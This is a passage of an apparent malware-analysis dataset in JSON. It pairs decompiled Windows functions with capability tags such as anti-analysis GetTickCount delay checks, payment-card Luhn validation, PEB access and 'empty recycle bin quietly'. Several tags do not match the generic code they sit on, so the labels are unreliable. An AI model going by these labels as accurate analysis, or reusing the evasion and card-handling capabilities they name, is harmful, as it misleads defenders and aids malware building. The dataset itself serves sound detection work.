        "decompiled_code": "\nvoid __cdecl fcn.0040a1cf(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar7;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    int16_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    float10 fVar15;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    uVar6 = *unaff_ESI;\n    uVar10 = unaff_ESI[1];\n    if ((uVar6 | uVar10) != 0) {\n        if (uVar10 < 0) {\n            bVar14 = uVar6 != 0;\n            uVar6 = -uVar6;\n            uVar10 = -bVar14 - uVar10;\n        }\n        iVar8 = 0;\n        iVar11 = *(unaff_EBP + 8);\n        if (iVar11 < 0) {\n            iVar11 = 0;\n        }\n        if (3 < iVar11) {\n            iVar11 = 4;\n            uVar2 = uVar6;\n            iVar3 = iVar8;\n            do {\n                iVar8 = iVar3;\n                uVar6 = uVar2;\n                bVar14 = 0xde0b6b2 < uVar10;\n                uVar1 = uVar10 + 0xf21f494d;\n                uVar10 = uVar1 - (uVar6 < 0xa7640000);\n                uVar2 = uVar6 + 0x589c0000;\n                iVar3 = iVar8 + 1;\n            } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);\n            uVar10 = uVar10 + 0xde0b6b3 + (0x589bffff < uVar6 + 0x589c0000);\n        }\n        *(unaff_EBP + -0x20) = uVar6;\n        *(unaff_EBP + -0x1c) = uVar10;\n        fVar15 = *(unaff_EBP + -0x20);\n        if (4 - iVar11 != 0) {\n            fVar15 = fVar15 / *(*(unaff_EBP + -4) + 0x40a1bb + (4 - iVar11) * 4);\n        }\n        *(unaff_EBP + -0x18) = fVar15;\n        piVar12 = unaff_EBX + 3;\n        if (iVar8 != 0) {\n            piVar13 = unaff_EBX + 2;\n            *piVar12 = iVar8 + '0';\n            iVar8 = 9;\n            goto code_r0x0040a266;\n        }\n        iVar8 = 9;\n        do {\n            uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n            uVar4 = CONCAT11(uVar9, uVar9 >> 4);\n            piVar13 = piVar12;\n            if (uVar9 >> 4 != 0) goto code_r0x0040a26f;\n            uVar7 = uVar4 >> 8;\n            if ((uVar9 & 0xf) != 0) goto code_r0x0040a276;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar5 = 0;\n    uVar9 = 0;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040a29c:\n    *unaff_EBX = iVar5;\n    *(unaff_EBX + 1) = uVar9;\n    return;\ncode_r0x0040a276:\n    while( true ) {\n        piVar13 = piVar12 + 1;\n        *piVar12 = (uVar7 & 0xf) + 0x30;\n        iVar8 = iVar8 + -1;\n        if (iVar8 == 0) break;\ncode_r0x0040a266:\n        uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n        uVar4 = CONCAT11(uVar9, uVar9 >> 4);\ncode_r0x0040a26f:\n        uVar7 = uVar4 >> 8;\n        piVar12 = piVar13 + 1;\n        *piVar13 = uVar4 + '0';\n    }\n    iVar5 = piVar13 - (unaff_EBX + 3 + iVar11);\n    do {\n        *piVar13 = '\\0';\n        piVar13 = piVar13 + -1;\n    } while (*piVar13 == '0');\n    uVar9 = unaff_ESI[1] >> 0x1f;\n    goto code_r0x0040a29c;\n}\n",
        "token_count": 1155
    },
    "0045b914": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045b914(void)\n\n{\n    fcn.0040e630();\n    return;\n}\n",
        "token_count": 25
    },
    "00461c68": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00461c68(uint arg_8h)\n\n{\n    char in_AL;\n    char *in_ECX;\n    char in_DL;\n    uint var_1h;\n    \n    if ((in_AL + -0x30) - (in_DL + -0x30 + *in_ECX) < 10) {\n        fcn.004047b0();\n        *in_ECX = '\\0';\n    }\n    else {\n        fcn.004047b0();\n        *in_ECX = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00403250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403250(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    \n    puVar6 = in_EAX;\n    if (in_EAX == NULL) {\ncode_r0x004032c6:\n        puVar6 = puVar6 + 1;\n    }\n    else {\n        uVar2 = 0;\n        do {\n            puVar5 = puVar6;\n            uVar3 = *puVar5;\n            puVar6 = puVar5 + 1;\n        } while (uVar3 == 0x20);\n        bVar1 = false;\n        if (uVar3 == 0x2d) {\n            bVar1 = true;\ncode_r0x004032d6:\n            uVar3 = *puVar6;\n            puVar6 = puVar5 + 2;\n        }\n        else if (uVar3 == 0x2b) goto code_r0x004032d6;\n        if (((uVar3 == 0x24) || (uVar3 == 0x78)) || (uVar3 == 0x58)) {\ncode_r0x004032db:\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            if (uVar3 != 0) {\n                do {\n                    if (0x60 < uVar3) {\n                        uVar3 = uVar3 - 0x20;\n                    }\n                    uVar4 = uVar3 - 0x30;\n                    if (9 < uVar4) {\n                        if (5 < uVar3 + 0xbf) goto code_r0x004032cf;\n                        uVar4 = uVar3 - 0x37;\n                    }\n                    if (0xfffffff < uVar2) goto code_r0x004032cf;\n                    uVar2 = uVar2 * 0x10 + uVar4;\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (uVar3 != 0);\ncode_r0x00403318:\n                iVar7 = 0;\n                goto code_r0x0040331b;\n            }\n            goto code_r0x004032c6;\n        }\n        if (uVar3 != 0x30) {\n            if (uVar3 != 0) goto code_r0x004032a2;\n            goto code_r0x004032cf;\n        }\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if ((uVar3 == 0x78) || (uVar3 == 0x58)) goto code_r0x004032db;\n        while (uVar3 != 0) {\ncode_r0x004032a2:\n            if ((9 < uVar3 - 0x30) || (0xccccccc < uVar2)) goto code_r0x004032cf;\n            uVar2 = uVar2 * 10 + (uVar3 - 0x30);\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n        }\n        if (bVar1) {\n            if ((-1 < uVar2) || (0 < uVar2)) goto code_r0x00403318;\n        }\n        else if (-1 < uVar2) goto code_r0x00403318;\n    }\ncode_r0x004032cf:\n    iVar7 = puVar6 - in_EAX;\ncode_r0x0040331b:\n    *param_2 = iVar7;\n    return;\n}\n",
        "token_count": 854
    },
    "0040b730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b730(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = '\\0';\n    fcn.0040b70c();\n    iVar3 = *in_EDX;\n    uVar1 = 0;\n    while( true ) {\n        iVar2 = fcn.00404888();\n        if (((iVar2 < iVar3) || (9 < *(in_EAX + -1 + iVar3) - 0x30U)) || (999 < uVar1)) break;\n        uVar1 = uVar1 * 10 + (*(in_EAX + -1 + iVar3) - 0x30);\n        iVar3 = iVar3 + 1;\n    }\n    iVar2 = *in_EDX;\n    if (iVar2 < iVar3) {\n        *arg_8h = iVar3 - *in_EDX;\n        *in_EDX = iVar3;\n        *in_ECX = uVar1;\n        in_EDX = in_ECX;\n    }\n    return in_EDX & 0xffffff00 | iVar2 < iVar3;\n}\n",
        "token_count": 302
    },
    "00420040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint32_t fcn.00420040(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00421a0c();\n    return uVar1 & 0xffffff00 | uVar1 == '\\t';\n}\n",
        "token_count": 55
    },
    "0042d37c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t * fcn.0042d37c(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x42d396;\n    var_8h = fcn.0042b3a8();\n    uStack48 = 0x42d45b;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    fcn.0042b978();\n    fcn.00426a20();\n    fcn.00426904();\n    arg_ch = (**(*var_8h + 0x20))();\n    arg_8h = &fcn.0042d37c::var_18h;\n    (**(*var_8h + 0x2c))();\n    fcn.0041b080(arg_8h, arg_ch);\n    fcn.00426ca8();\n    uVar4 = 0;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = uVar4 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            uVar2 = uVar3 & 0x80000001;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == uVar2) {\n                fcn.00427004(var_4h);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != 9);\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 9);\n    fcn.0042b634();\n    *in_FS_OFFSET = arg_8h;\n    return var_8h;\n}\n",
        "token_count": 545
    },
    "00466600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466600(int32_t arg_8h, int16_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_104h;\n    uint var_4h;\n    \n    if (0x40 < *(arg_10h + 1)) {\n        fcn.0040c998();\n        arg_ch = fcn.00403fc0();\n    }\n    if (*arg_ch == 9) {\n        var_4h = *(arg_ch + 4);\n    }\n    else if (*arg_ch == 0x4009) {\n        var_4h = **(arg_ch + 4);\n    }\n    else {\n        fcn.004665e8();\n    }\n    fcn.00466500(&var_104h);\n    if (arg_8h != 0) {\n        fcn.004104c0();\n    }\n    fcn.00466178(arg_8h, arg_14h);\n    return;\n}\n",
        "token_count": 221
    },
    "0047cac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047cac0(int16_t *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar3;\n    int32_t *piStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    int16_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = 0x47cadd;\n    fcn.00404f64();\n    uStack72 = 0x47cb67;\n    piStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack68 = &stack0xfffffffc;\n    fcn.0047b7a4();\n    var_ch = 0x48421c;\n    var_8h = 1;\n    var_4h = 1;\n    if (*param_1 == 9) {\n        uVar1 = 8;\n    }\n    else {\n        uVar1 = 4;\n    }\n    piVar3 = *(in_EAX + 0x224);\n    var_10h = param_1;\n    iVar2 = (**(*piVar3 + 0x18))\n                      (piVar3, param_2, *0x484328, 0, uVar1, &fcn.0047cac0::var_10h, 0, &fcn.0047cac0::var_30h, 0);\n    if (iVar2 != 0) {\n        fcn.00466770();\n    }\n    *in_FS_OFFSET = piVar3;\n    fcn.00405034(0x47cb6e);\n    return;\n}\n",
        "token_count": 408
    },
    "004208e8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nfloat10 fcn.004208e8(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float10 fStack24;\n    \n    cVar2 = fcn.00421a0c();\n    if (cVar2 == '\\x05') {\n        fcn.0041ffb8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.00420b70();\n        fStack24 = iVar1;\n    }\n    return fStack24;\n}\n",
        "token_count": 137
    },
    "0043e7fc": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043e7fc(uint *param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    ulong uVar5;\n    \n    if (*(in_EAX + 0x5b) == '\\x05') {\n        uVar4 = CONCAT31(in_EAX >> 8, 1);\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = *param_1;\n        uVar5 = (**(*in_EAX + 0x34))();\n        uVar4 = uVar5;\n        uVar1 = *(in_EAX + 0x5b);\n        if ((uVar1 == 0) || (uVar1 - 3 < 2)) {\n            *param_2 = uVar2;\n        }\n        param_2 = uVar5 >> 0x20 & 0xffffff00 | uVar1 - 3;\n        if (uVar1 < 3) {\n            *param_1 = uVar3;\n            param_2 = param_1;\n        }\n    }\n    return CONCAT44(param_2, uVar4);\n}\n",
        "token_count": 278
    },
    "0046041c": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046041c(uint param_1, uint *param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint in_stack_ffffffd0;\n    double dVar4;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x460528;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    uVar1 = *in_EAX;\n    if (uVar1 < 2) {\n        *param_2 = *0x483f88;\n        param_2[1] = *0x483f8c;\n        param_2[2] = *0x483f90;\n        param_2[3] = *0x483f94;\n        puStack32 = &stack0xfffffffc;\n    }\n    else if (uVar1 == 0x100) {\n        puStack32 = &stack0xfffffffc;\n        fcn.00413a6c();\n        iVar2 = fcn.0045ffc4();\n        *param_2 = *(iVar2 + 4);\n        param_2[1] = *(iVar2 + 8);\n        param_2[2] = *(iVar2 + 0xc);\n        param_2[3] = *(iVar2 + 0x10);\n    }\n    else if (uVar1 == 8) {\n        puStack32 = &stack0xfffffffc;\n        fcn.00413a6c();\n        iVar2 = fcn.0045ffc4();\n        *param_2 = *(iVar2 + 4);\n        param_2[1] = *(iVar2 + 8);\n        param_2[2] = *(iVar2 + 0xc);\n        param_2[3] = *(iVar2 + 0x10);\n    }\n    else {\n        uVar1 = *in_EAX;\n        if ((uVar1 == 5) || (uVar1 == 7)) {\n            puStack32 = &stack0xfffffffc;\n            fVar3 = fcn.00412a5c();\n            dVar4 = fVar3;\n            fcn.0046066c(SUB84(dVar4, 0), dVar4 >> 0x20);\n            in_stack_ffffffd0 = SUB84(dVar4, 0);\n        }\n        else if (uVar1 == *(*0x483fa0 + 4)) {\n            iVar2 = *(in_EAX + 4);\n            *param_2 = *(iVar2 + 4);\n            param_2[1] = *(iVar2 + 8);\n            param_2[2] = *(iVar2 + 0xc);\n            param_2[3] = *(iVar2 + 0x10);\n            puStack32 = &stack0xfffffffc;\n        }\n        else {\n            fcn.0040675c();\n            fcn.0040c8dc();\n            fcn.00403fc0();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x46052f;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 759
    },
    "00403368": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00403368(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "0040365c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint fcn.0040365c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetKeyboardType(0);\n    if (iVar1 == 7) {\n        uVar2 = sub.user32.dll_GetKeyboardType(1);\n        if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 136
    },
    "00403b08": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00403b08(uint param_1, uint8_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    \n    uVar3 = 0;\n    uVar6 = 0;\n    uVar4 = *param_2;\n    piVar2 = in_EAX;\n    do {\n        puVar1 = *(*piVar2 + -0x38);\n        if (puVar1 != NULL) {\n            uVar6 = uVar6 & 0xffff0000 | *puVar1;\n            piVar5 = puVar1 + 3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                if (*(piVar5 + 6) == uVar4) {\n                    while (((*(uVar3 + 6 + piVar5) ^ param_2[uVar3]) & 0xdf) == 0) {\n                        uVar3 = uVar3 - 1;\n                        if (uVar3 == 0) {\n                            piVar2 = *piVar5 + in_EAX;\n                            goto code_r0x00403b54;\n                        }\n                    }\n                    uVar4 = *param_2;\n                    uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                }\n                piVar5 = uVar3 + 7 + piVar5;\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        piVar2 = *(*piVar2 + -0x24);\n    } while (piVar2 != NULL);\ncode_r0x00403b54:\n    return CONCAT44(in_EAX, piVar2);\n}\n",
        "token_count": 429
    },
    "0040c2f0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c2f0(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x40c355;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    for (iVar2 = 1; *(iVar2 * 4 + 0x48576c) != -1; iVar2 = iVar2 + 1) {\n        if (iVar2 == 7) goto code_r0x0040c33f;\n    }\n    fcn.004047c0();\n    uVar1 = fcn.00408da0();\n    *(iVar2 * 4 + 0x48576c) = uVar1;\ncode_r0x0040c33f:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40c35c;\n    uStack24 = 0x40c354;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 272
    },
    "0047c4c8": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047c4c8(int32_t *param_1)\n\n{\n    bool bVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x208) + 0x30) < 300) {\n        puStack36 = 0x47c4f4;\n        fcn.0047c2e4();\n    }\n    else {\n        puStack36 = 0x47c504;\n        fcn.0047c018();\n        if (0xffff < var_10h) {\n            uStack40 = 0x47c585;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            iVar3 = param_1[2];\n            if (iVar3 != 0) {\n                bVar1 = false;\n                puVar4 = *param_1 + iVar3 * 0x10;\n                do {\n                    puVar4 = puVar4 + -4;\n                    uVar2 = *puVar4;\n                    if (uVar2 < 5) {\n                        if (uVar2 != 4) {\ncode_r0x0047c543:\n                            if (!bVar1) {\n                                bVar1 = true;\n                            }\n                        }\n                    }\n                    else if (7 < uVar2) goto code_r0x0047c543;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            puStack36 = &stack0xfffffffc;\n            (*var_10h)();\n            *in_FS_OFFSET = uStack44;\n        }\n    }\n    return;\n}\n",
        "token_count": 434
    },
    "0040368c": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040368c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint var_ch;\n    uint32_t var_8h;\n    uint hKey;\n    \n    var_8h = *0x483024;\n    puStack20 = &fcn.0040368c::hKey;\n    uStack24 = 1;\n    uStack28 = 0;\n    uStack32 = 0x403724;\n    uStack36 = 0x80000002;\n    puStack40 = 0x4036b3;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack44 = 0x4036fd;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_ch = 4;\n        uVar2 = hKey;\n        puStack40 = &stack0xfffffffc;\n        sub.advapi32.dll_RegQueryValueExA(hKey, 0x403740, 0, 0, &fcn.0040368c::var_8h, &fcn.0040368c::var_ch);\n        *in_FS_OFFSET = uVar2;\n        sub.advapi32.dll_RegCloseKey(hKey, 0x403704);\n        return;\n    }\n    *0x483024 = *0x483024 & 0xffc0 | var_8h & 0x3f;\n    return;\n}\n",
        "token_count": 395
    },
    "0046332c": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint8_t fcn.0046332c(void)\n\n{\n    uint8_t in_AL;\n    \n    if ((in_AL & 0x80) != 0) {\n        return in_AL & 0x3f;\n    }\n    return in_AL & 0x3f | 0x80;\n}\n",
        "token_count": 68
    },
    "00463a08": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00463ac3)\n\nvoid __fastcall fcn.00463a08(uint *param_1, uint param_2)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    bool bVar5;\n    uint *puStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    puStack68 = 0x463a26;\n    var_8h = param_2;\n    fcn.00404a78();\n    puStack68 = 0x463a2e;\n    fcn.00404a78();\n    uStack72 = 0x463af1;\n    iStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x463a46;\n    puStack68 = &stack0xfffffffc;\n    pcVar1 = fcn.00404a88();\n    bVar5 = *pcVar1 == '-';\n    if (bVar5) {\n        puStack80 = &fcn.00463a08::var_4h;\n        fcn.00404888();\n        fcn.00404ae8();\n    }\n    pcVar1 = fcn.00404a88();\n    if (*pcVar1 == '-') {\n        bVar5 = !bVar5;\n        fcn.00404888(&fcn.00463a08::var_8h);\n        fcn.00404ae8();\n    }\n    fcn.004625f4();\n    fcn.00461504();\n    puVar3 = &fcn.00463a08::var_30h;\n    puVar4 = param_1;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar3;\n    if (bVar5) {\n        *(param_1 + 1) = *(param_1 + 1) & 0x3f | 0x80;\n    }\n    *in_FS_OFFSET = puStack80;\n    uStack72 = 0x463af8;\n    iStack76 = 0x463af0;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 590
    },
    "00463d28": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463d28(uint8_t *param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint32_t arg_8h;\n    bool bVar5;\n    bool bVar6;\n    uint32_t arg_10h;\n    uint32_t arg_10h_00;\n    uchar *puVar7;\n    int32_t arg_ch;\n    uchar *arg_10h_01;\n    uint8_t uStack95;\n    uint8_t uStack94;\n    uchar auStack93 [33];\n    uint8_t uStack60;\n    uchar auStack59 [6];\n    uchar auStack53 [37];\n    \n    puVar7 = auStack53;\n    arg_ch = 1;\n    fcn.004637b8(1, puVar7);\n    arg_8h = uStack95;\n    bVar5 = (*(in_EAX + 1) & 0x80) != 0;\n    bVar6 = (*(arg_ch + 1) & 0x80) != 0;\n    *param_1 = uStack95;\n    if ((bVar5 == bVar6) || ((uStack60 & 0x3f) <= (uStack94 & 0x3f))) {\n        param_1[1] = uStack94;\n    }\n    else {\n        uVar1 = fcn.0046332c(arg_ch, puVar7, param_2);\n        param_1[1] = uVar1;\n    }\n    puVar7 = auStack93;\n    arg_10h_01 = auStack59;\n    fcn.004031a8();\n    if (bVar5 == bVar6) {\n        fcn.004631cc(arg_8h, param_1 + 2, arg_10h_01, puVar7);\n    }\n    else {\n        arg_10h_00 = arg_8h;\n        uVar2 = fcn.004630d0(arg_8h, puVar7);\n        uVar3 = fcn.004630d0(arg_8h, arg_ch);\n        if (uVar3 < uVar2) {\n            fcn.00463114(arg_8h, puVar7, arg_10h_00, arg_ch);\n        }\n        else if (uVar2 < uVar3) {\n            fcn.00463114(arg_8h, puVar7, arg_ch, arg_10h_00);\n            uVar1 = fcn.0046332c();\n            param_1[1] = uVar1;\n        }\n        else {\n            arg_10h = arg_8h;\n            iVar4 = fcn.00463284(arg_8h, arg_8h, arg_10h_00, arg_ch);\n            if (iVar4 < 0) {\n                fcn.00463114(arg_8h, arg_ch, arg_10h, arg_10h_00);\n                uVar1 = fcn.0046332c();\n                param_1[1] = uVar1;\n            }\n            else {\n                fcn.00463114(arg_8h, arg_ch, arg_10h_00, arg_10h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 749
    },
    "004041e4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004041e4(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t **in_FS_OFFSET;\n    \n    if (*0x48563c != NULL) {\n        ppiVar1 = *in_FS_OFFSET;\n        if (*0x48563c == ppiVar1) {\n            *in_FS_OFFSET = **0x48563c;\n            return;\n        }\n        for (; ppiVar1 != 0xffffffff; ppiVar1 = *ppiVar1) {\n            if (*ppiVar1 == *0x48563c) {\n                *ppiVar1 = **0x48563c;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00409ea9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
